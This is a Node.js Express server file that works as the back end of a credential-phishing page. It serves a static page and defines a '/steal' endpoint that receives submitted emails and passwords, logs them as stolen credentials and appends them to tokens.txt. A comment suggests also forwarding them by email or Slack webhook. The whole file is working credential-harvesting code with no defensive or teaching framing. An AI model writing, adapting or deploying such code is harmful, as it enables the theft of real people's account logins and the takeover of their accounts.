const express = require('express');
const app = express();
app.use(express.json());
app.use(express.static('public')); // Serve index.html

// Endpoint to capture login data
app.post('/steal', (req, res) => {
    const { email, password } = req.body;
    console.log(`Stolen Credentials: ${email} : ${password}`);
    
    // You can save this to a file or send it via email/Slack webhook
    // For example, save to tokens.txt
    require('fs').appendFileSync('tokens.txt', `${email}:${password}\n`);

    res.json({ success: true });
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});
